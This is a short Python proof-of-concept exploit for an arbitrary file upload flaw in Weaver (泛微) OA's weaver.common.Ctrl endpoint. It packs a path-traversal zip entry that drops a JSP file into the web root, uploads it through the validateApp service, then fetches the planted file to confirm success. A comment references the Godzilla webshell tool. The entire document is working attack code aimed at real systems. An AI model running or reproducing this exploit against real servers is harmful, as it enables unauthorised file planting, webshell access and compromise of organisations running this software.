import httpx
import zipfile
from lib.get_normal_url import get_standard_url
mm = '123qwe'

webshell_name1 = mm+'.jsp'
webshell_name2 = '../../../'+webshell_name1

def file_zip():
    shell = """202cb962ac59075b964b07152d234b70"""   ## 哥斯拉3.0 test11.jsp //test!
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def poc(target):
    target = get_standard_url(target)
    file_zip()
    upload_url = target + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    try:
       res1 = httpx.post(url=upload_url,files=file,timeout=20,verify=False)
    except Exception as e:
          print(e)
    GetShellurl = target + '/cloudstore/' + webshell_name1
    GetShell_res = httpx.get(url = GetShellurl,timeout=10,verify=False)
    if GetShell_res.status_code == 200 and "202cb962ac59075b964b07152d234b70" in GetShell_res.text:
        print("\033[0;31m 泛微OA weaver.common.Ctrl 任意文件上传漏洞："+ GetShellurl )


